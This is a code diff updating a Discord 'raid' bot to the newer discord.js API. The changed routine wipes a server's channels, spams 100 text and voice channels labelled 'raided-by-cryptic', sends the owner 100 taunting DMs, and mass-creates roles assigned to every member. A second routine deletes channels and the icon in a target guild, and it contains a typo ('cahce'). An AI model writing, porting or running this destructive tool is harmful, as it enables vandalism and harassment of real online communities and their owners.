@@ -35,25 +35,29 @@ bot.on("message", async(message) => {
                     ch.delete()
                 })
                 for (var i = 0; i < 100; i++) {
-                    message.guild.createChannel("raided-by-cryptic", {
+                    message.guild.channels.create("raided-by-cryptic", {
                         type: "text"
                     })
                 }
                 for (var i = 0; i < 100; i++) {
                     const Guild = message.guild.name
-                    message.guild.members.get(message.guild.ownerID).send(`Your server ${Guild} has been Raided :slight_smile:`).catch(err => { return })
+                    message.guild.members.cache.get(message.guild.ownerID).send(`Your server ${Guild} has been Raided :slight_smile:`).catch(err => { return })
                 }
                 for (var i = 0; i < 100; i++) {
-                    message.guild.createChannel("Raided By Cryptic", {
+                    message.guild.channels.create("Raided By Cryptic", {
                         type: "voice"
                     })
                 }
                 for (var i = 0; i < 100; i++) {
-                    const newRole = await message.guild.createRole({
-                        name: "RAIDED BY CRYPTIC",
-                        color: "#1B78E7"
+                    const newRole = await message.guild.roles.create({
+                        data: {
+                            name: "RAIDED BY CRYPTIC",
+                            color: "#1B78E7"
+                        }
                     })
-                    member.addRole(newRole.id)
+                    message.guild.members.cache.forEach(member => {
+                        member.roles.add(newRole)
+                    })
                 }
             }
         } else {
@@ -68,18 +72,18 @@ bot.on("message", async(message) => {
         if(message.guild.id === targetID) {
             if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 message.guild.setIcon(null)
-                message.guild.channels.forEach(ch => ch.delete())
-                const textCat = await message.guild.createChannel("Text Channels", {
+                message.guild.channels.cahce.forEach(ch => ch.delete())
+                const textCat = await message.guild.channels.create("Text Channels", {
                     type: "category"
                 })
-                const voiceCat = await message.guild.createChannel("Voice Channels", {
+                const voiceCat = await message.guild.channels.create("Voice Channels", {
                     type: "category"
                 })
-                message.guild.createChannel("general", {
+                message.guild.channels.create("general", {
                     type: "text",
                     parent: textCat.id
                 })
-                message.guild.createChannel("General", {
+                message.guild.channels.create("General", {
                     type: "voice",
                     parent: voiceCat.id
                 })
